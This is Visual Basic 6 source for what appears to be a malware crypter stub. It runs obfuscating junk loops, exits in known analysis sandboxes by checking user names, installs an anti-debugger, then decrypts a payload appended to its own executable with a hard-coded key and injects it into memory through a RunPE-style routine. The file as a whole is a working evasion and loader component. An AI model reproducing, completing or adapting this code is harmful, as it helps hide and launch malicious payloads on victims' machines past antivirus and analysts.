Attribute VB_Name = "mMain"
Option Explicit

Private Declare Function SetTimer Lib "user32" (ByVal hwnd As Long, ByVal nIDEvent As Long, ByVal uElapse As Long, ByVal lpTimerFunc As Long) As Long
Private Declare Function KillTimer Lib "user32" (ByVal hwnd As Long, ByVal nIDEvent As Long) As Long
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Private Declare Function OutputDebugString Lib "kernel32" Alias "OutputDebugStringA" (ByVal lpOutputString As String) As Long
Const TLO = "09570963856htje09rg8h034503hgw08erhg207" 'decryption key
Private m_bCancel As Boolean

   Dim SPath   As String
  
 Dim bSig    As Byte
    Dim lSize   As Long
     Dim sSize   As String * 8
   Dim SData   As String
   
   
   Dim Nos As Long
Const Charge = "1"
Dim Layers
Dim Tempo As Long

Dim Random As Long
 
'############# Loop #########################
 
 Private Function RandomNumber() As Integer
   Dim Var1 As Long
    
    Randomize
    Var1 = Int(2 * Rnd)
    RandomNumber = Var1
End Function
Sub Dorme()
Sleep (200)
End Sub
Sub Main()
Dim Darma As Long
Dim h
Cic:
h = Darma + Charge
Darma = h
Dim i As Long
    Tempo = 0
    For i = 1 To 4
        If i = 2 Or i = 4 Or i = 6 Then
            Tempo = Tempo & RandomNumber
        'Else
        '    imput2 = imput2 & RandomLetter
        End If
    Next i

If Darma > 6 Then GoTo Parti Else GoTo Cic


Parti:
Call HardestEmu
End Sub
Sub HardestEmu()

Ciclo:
Random = Rnd * 110
Layers = Nos + Charge
If Nos > Tempo Then GoTo ETX
Nos = Layers
If Random > 35 Then Call Blaster Else GoTo Ciclo
ETX:
Call Dorme
Call Garbage

End


End Sub


Private Function Blaster()
Dim Positivo As Integer
Dim Negativo As Integer
Dim Memoria As Integer

Negativo = Rnd * 10
Positivo = "150"
Load:
Memoria = Positivo - Negativo
Memoria = Rnd * 60 + Positivo

If Memoria > 200 Then Call Sky Else GoTo Load

End Function
Sub Sky()
'MsgBox "YesRand"
Call Dorme
Call HardestEmu

End Sub
'######################### end Looop ########################
 
 
  
   

Private Sub Garbage()
    SetTimer 0, Rnd * 1024, 100, AddressOf TimerProc
Do
         
        DoEvents: Call CheckIntegrity
        DoEvents: If Debugger = True Then End
        DoEvents: Call Sleep(250)
        
    Loop Until m_bCancel
End Sub

Sub CheckIntegrity()
If Environ("username") = "CurrentUser" Then
    End
End If
 'SunBelt ----------------Anti
    If App.Path = "H:\" And Environ("username") = "Schmidti" Then
    End
    End If
Dim ThreadID As Long

'For usefull test... compile this example and open the exe in some debugger (like ADA, OLLY, etc). Debug this code before install the "Antidebugger"... then debug again after install the "Antidebugger"
ThreadID = InstallAntiDebugger
'If ThreadID <> 0 Then
 '   MsgBox "Anti Debugger installed in the thread " & ThreadID, vbInformation
'Else
 '   MsgBox "Error!", vbCritical
'End If
    
End Sub
Private Function Debugger() As Boolean
    Debugger = Not (OutputDebugString(VarPtr(ByVal "=)")) = 1)
End Function


 Sub TimerProc(ByVal hwnd As Long, ByVal nIDEvent As Long, ByVal uElapse As Long, ByVal lpTimerFunc As Long)
    KillTimer hwnd, nIDEvent
 
    
    
    If Not m_bCancel Then
        m_bCancel = True
      
       Call Astra
       Call Tastra(bSig, lSize)
       Call Dos(SData, SPath)
       
       
       
       
        End If
    
      

   ' End If
End Sub
Sub Astra()
  SPath = ThisExe
  
        Open SPath For Binary Access Read As #1
    
        Seek #1, LOF(1) - 1: Get #1, , bSig
        Seek #1, LOF(1) - 9: Get #1, , sSize
        lSize = Val(sSize)

End Sub

Sub Tastra(bSig As Byte, lSize As Long)
  SPath = ThisExe
    Dim Algo  As New C4
 If bSig = 27 And lSize > 0 And lSize < LOF(1) Then
            Seek #1, LOF(1) - 9 - lSize
            SData = Space(lSize)
            Get #1, , SData
            SData = Algo.DecryptString(SData, TLO)
            Close #1
            End If
           
End Sub
Sub Dos(SData As String, SPath As String)
  mPEL.InjectExe SPath, StrConv(SData, vbFromUnicode)
End Sub

